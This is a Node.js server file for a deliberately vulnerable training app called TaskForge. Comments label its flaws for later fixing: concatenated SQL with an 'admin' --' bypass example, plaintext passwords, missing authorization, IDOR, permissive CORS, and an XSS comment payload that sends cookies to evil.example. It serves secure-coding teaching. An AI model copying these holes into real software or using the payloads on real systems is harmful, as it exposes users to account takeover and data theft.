// server.js
// TaskForge - Phase 1 baseline (intentionally insecure in places - see comments
// marked "VULNERABLE (Phase 1)". These are fixed in the Phase 2 secure-coding pass.
"use strict";

const http = require("node:http");
const fs = require("node:fs");
const path = require("node:path");
const crypto = require("node:crypto");
const { URL } = require("node:url");
const db = require("./db");

const PORT = process.env.PORT || 3000;
const PUBLIC_DIR = path.join(__dirname, "public");

// ---------------------------------------------------------------------------
// Super-simple in-memory session store: sessionId -> { userId, username, role }
// ---------------------------------------------------------------------------
const sessions = new Map();

function createSession(user) {
  const sid = crypto.randomBytes(16).toString("hex");
  sessions.set(sid, { userId: user.id, username: user.username, role: user.role });
  return sid;
}

function getSession(req) {
  const cookieHeader = req.headers.cookie || "";
  const match = cookieHeader.match(/tf_session=([a-f0-9]+)/);
  if (!match) return null;
  return sessions.get(match[1]) || null;
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------
function sendJSON(res, statusCode, data) {
  const body = JSON.stringify(data);
  res.writeHead(statusCode, { "Content-Type": "application/json" });
  res.end(body);
}

function readBody(req) {
  return new Promise((resolve, reject) => {
    let data = "";
    req.on("data", (chunk) => {
      data += chunk;
      if (data.length > 5_000_000) {
        req.destroy();
        reject(new Error("Body too large"));
      }
    });
    req.on("end", () => {
      try {
        resolve(data ? JSON.parse(data) : {});
      } catch {
        resolve({});
      }
    });
    req.on("error", reject);
  });
}

const MIME = {
  ".html": "text/html",
  ".css": "text/css",
  ".js": "text/javascript",
  ".json": "application/json",
};

function serveStatic(req, res, pathname) {
  let filePath = pathname === "/" ? "/login.html" : pathname;
  filePath = path.join(PUBLIC_DIR, filePath);

  // NOTE: no path traversal protection here on purpose is avoided (we do
  // resolve + check prefix) - but this is otherwise a plain static file server.
  const resolved = path.resolve(filePath);
  if (!resolved.startsWith(PUBLIC_DIR)) {
    res.writeHead(403);
    return res.end("Forbidden");
  }

  fs.readFile(resolved, (err, content) => {
    if (err) {
      res.writeHead(404);
      return res.end("Not found");
    }
    const ext = path.extname(resolved);
    res.writeHead(200, { "Content-Type": MIME[ext] || "application/octet-stream" });
    res.end(content);
  });
}

// ---------------------------------------------------------------------------
// Route handlers
// ---------------------------------------------------------------------------

async function handleRegister(req, res) {
  const { username, password, role } = await readBody(req);
  if (!username || !password) {
    return sendJSON(res, 400, { error: "username and password required" });
  }

  // VULNERABLE (Phase 1): the client is trusted to send a safe "role" value.
  // There is no server-side check that only 'employee' is allowed for
  // self-registration - a user can register as 'admin' directly.
  const finalRole = role || "employee";

  try {
    const stmt = db.prepare(
      "INSERT INTO users (username, password, role) VALUES (?, ?, ?)"
    );
    // VULNERABLE (Phase 1): password stored in plaintext (see db.js note).
    stmt.run(username, password, finalRole);
    sendJSON(res, 201, { message: "registered" });
  } catch (e) {
    sendJSON(res, 400, { error: "username already exists" });
  }
}

async function handleLogin(req, res) {
  const { username, password } = await readBody(req);

  // VULNERABLE (Phase 1): query built by string concatenation, not
  // parameterised - classic SQL Injection surface for Phase 3 testing.
  // e.g. username = admin' -- would bypass the password check entirely.
  const sql = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
  let user;
  try {
    user = db.prepare(sql).get();
  } catch (e) {
    return sendJSON(res, 500, { error: "database error" });
  }

  if (!user) {
    return sendJSON(res, 401, { error: "invalid credentials" });
  }

  const sid = createSession(user);

  // VULNERABLE (Phase 1): cookie is missing HttpOnly / Secure / SameSite
  // attributes, making it readable from JS and sendable cross-site.
  res.setHeader("Set-Cookie", `tf_session=${sid}; Path=/`);
  sendJSON(res, 200, { message: "logged in", role: user.role, username: user.username });
}

function handleLogout(req, res) {
  const cookieHeader = req.headers.cookie || "";
  const match = cookieHeader.match(/tf_session=([a-f0-9]+)/);
  if (match) sessions.delete(match[1]);
  res.setHeader("Set-Cookie", "tf_session=; Path=/; Max-Age=0");
  sendJSON(res, 200, { message: "logged out" });
}

function handleMe(req, res) {
  const session = getSession(req);
  if (!session) return sendJSON(res, 401, { error: "not logged in" });
  sendJSON(res, 200, session);
}

function handleGetTasks(req, res, query) {
  const session = getSession(req);
  if (!session) return sendJSON(res, 401, { error: "not logged in" });

  const search = query.get("search") || "";

  // VULNERABLE (Phase 1): search term concatenated directly into SQL -
  // another SQL Injection surface, this time on a GET/search endpoint
  // (a very common real-world pentest target, per the syllabus's sqlmap use).
  const sql = `SELECT * FROM tasks WHERE title LIKE '%${search}%' OR description LIKE '%${search}%'`;

  let rows;
  try {
    rows = db.prepare(sql).all();
  } catch (e) {
    return sendJSON(res, 500, { error: "database error" });
  }

  // VULNERABLE (Phase 1): no server-side filtering by role/ownership.
  // An 'employee' can see every task (including tasks assigned to others,
  // and the seeded "Confidential salary review" task) - Broken Access
  // Control / excessive data exposure, to be fixed in Phase 2.
  sendJSON(res, 200, rows);
}

async function handleCreateTask(req, res) {
  const session = getSession(req);
  if (!session) return sendJSON(res, 401, { error: "not logged in" });

  // VULNERABLE (Phase 1): intended to be Manager/Admin only, but the role
  // check only exists in the frontend UI - there is no server-side
  // authorization check here. Any logged-in employee can call this directly.
  const { title, description, priority, assignee_id } = await readBody(req);
  if (!title) return sendJSON(res, 400, { error: "title required" });

  const stmt = db.prepare(
    "INSERT INTO tasks (title, description, status, priority, assignee_id, created_by) VALUES (?, ?, 'todo', ?, ?, ?)"
  );
  const info = stmt.run(title, description || "", priority || "medium", assignee_id || null, session.userId);
  sendJSON(res, 201, { id: Number(info.lastInsertRowid) });
}

async function handleUpdateTask(req, res, id) {
  const session = getSession(req);
  if (!session) return sendJSON(res, 401, { error: "not logged in" });

  // VULNERABLE (Phase 1): Insecure Direct Object Reference (IDOR).
  // There is no check that the task belongs to this user (or their team).
  // Any logged-in user can update ANY task by guessing/incrementing the id.
  const { status, title, description, priority, assignee_id } = await readBody(req);

  const existing = db.prepare("SELECT * FROM tasks WHERE id = ?").get(id);
  if (!existing) return sendJSON(res, 404, { error: "not found" });

  db.prepare(
    "UPDATE tasks SET status = ?, title = ?, description = ?, priority = ?, assignee_id = ? WHERE id = ?"
  ).run(
    status ?? existing.status,
    title ?? existing.title,
    description ?? existing.description,
    priority ?? existing.priority,
    assignee_id ?? existing.assignee_id,
    id
  );
  sendJSON(res, 200, { message: "updated" });
}

function handleDeleteTask(req, res, id) {
  const session = getSession(req);
  if (!session) return sendJSON(res, 401, { error: "not logged in" });

  // VULNERABLE (Phase 1): meant to be Admin-only - not enforced server-side.
  db.prepare("DELETE FROM tasks WHERE id = ?").run(id);
  sendJSON(res, 200, { message: "deleted" });
}

async function handleAddComment(req, res, taskId) {
  const session = getSession(req);
  if (!session) return sendJSON(res, 401, { error: "not logged in" });

  const { body } = await readBody(req);
  if (!body) return sendJSON(res, 400, { error: "comment body required" });

  // Comment text is stored exactly as submitted - no sanitisation.
  db.prepare("INSERT INTO comments (task_id, user_id, body) VALUES (?, ?, ?)").run(
    taskId,
    session.userId,
    body
  );
  sendJSON(res, 201, { message: "comment added" });
}

function handleGetComments(req, res, taskId) {
  const session = getSession(req);
  if (!session) return sendJSON(res, 401, { error: "not logged in" });

  const rows = db
    .prepare(
      `SELECT comments.*, users.username FROM comments
       JOIN users ON comments.user_id = users.id
       WHERE task_id = ? ORDER BY comments.id ASC`
    )
    .all(taskId);

  // VULNERABLE (Phase 1): comment "body" is returned raw. The frontend
  // (app.js) renders it with innerHTML, so a comment like
  // <script>document.location='https://evil.example/steal?c='+document.cookie</script>
  // executes in the viewer's browser - Stored XSS, made worse by the
  // missing HttpOnly flag on the session cookie above.
  sendJSON(res, 200, rows);
}

function handleGetUsers(req, res) {
  const session = getSession(req);
  if (!session) return sendJSON(res, 401, { error: "not logged in" });

  // VULNERABLE (Phase 1): meant to be Admin-only ("view audit log" /
  // manage users) - no role check here, so any logged-in user can list
  // every account, including plaintext-stored passwords - Broken Access
  // Control + severe Information Disclosure.
  const rows = db.prepare("SELECT id, username, password, role FROM users").all();
  sendJSON(res, 200, rows);
}

async function handleAvatar(req, res) {
  const session = getSession(req);
  if (!session) return sendJSON(res, 401, { error: "not logged in" });

  // VULNERABLE (Phase 1): avatar is accepted as an arbitrary string with no
  // size limit, content-type check, or validation of any kind.
  const { avatar } = await readBody(req);
  db.prepare("UPDATE users SET avatar = ? WHERE id = ?").run(avatar || "", session.userId);
  sendJSON(res, 200, { message: "avatar updated" });
}

// ---------------------------------------------------------------------------
// Router
// ---------------------------------------------------------------------------
const server = http.createServer(async (req, res) => {
  const url = new URL(req.url, `http://${req.headers.host}`);
  const { pathname, searchParams } = url;

  try {
    // CORS - VULNERABLE (Phase 1): reflects any Origin and allows
    // credentials, which is a dangerous combination (CORS misconfiguration,
    // named explicitly in the Iteration 3 syllabus).
    res.setHeader("Access-Control-Allow-Origin", req.headers.origin || "*");
    res.setHeader("Access-Control-Allow-Credentials", "true");
    res.setHeader("Access-Control-Allow-Headers", "Content-Type");
    res.setHeader("Access-Control-Allow-Methods", "GET,POST,PUT,DELETE,OPTIONS");
    if (req.method === "OPTIONS") {
      res.writeHead(204);
      return res.end();
    }

    if (pathname === "/api/register" && req.method === "POST") {
      return await handleRegister(req, res);
    }
    if (pathname === "/api/login" && req.method === "POST") {
      return await handleLogin(req, res);
    }
    if (pathname === "/api/logout" && req.method === "POST") {
      return handleLogout(req, res);
    }
    if (pathname === "/api/me" && req.method === "GET") {
      return handleMe(req, res);
    }
    if (pathname === "/api/tasks" && req.method === "GET") {
      return handleGetTasks(req, res, searchParams);
    }
    if (pathname === "/api/tasks" && req.method === "POST") {
      return await handleCreateTask(req, res);
    }
    if (pathname === "/api/users" && req.method === "GET") {
      return handleGetUsers(req, res);
    }
    if (pathname === "/api/profile/avatar" && req.method === "POST") {
      return await handleAvatar(req, res);
    }

    let m = pathname.match(/^\/api\/tasks\/(\d+)$/);
    if (m && req.method === "PUT") return await handleUpdateTask(req, res, m[1]);
    if (m && req.method === "DELETE") return handleDeleteTask(req, res, m[1]);

    m = pathname.match(/^\/api\/tasks\/(\d+)\/comments$/);
    if (m && req.method === "GET") return handleGetComments(req, res, m[1]);
    if (m && req.method === "POST") return await handleAddComment(req, res, m[1]);

    // Fall through to static file serving for the frontend
    if (pathname.startsWith("/api/")) {
      return sendJSON(res, 404, { error: "not found" });
    }
    return serveStatic(req, res, pathname);
  } catch (err) {
    console.error(err);
    sendJSON(res, 500, { error: "internal server error" });
  }
});

server.listen(PORT, () => {
  console.log(`TaskForge (Phase 1 baseline) running at http://localhost:${PORT}`);
  console.log(`Seed accounts: admin/admin123, manager1/manager123, employee1/employee123, employee2/employee123`);
});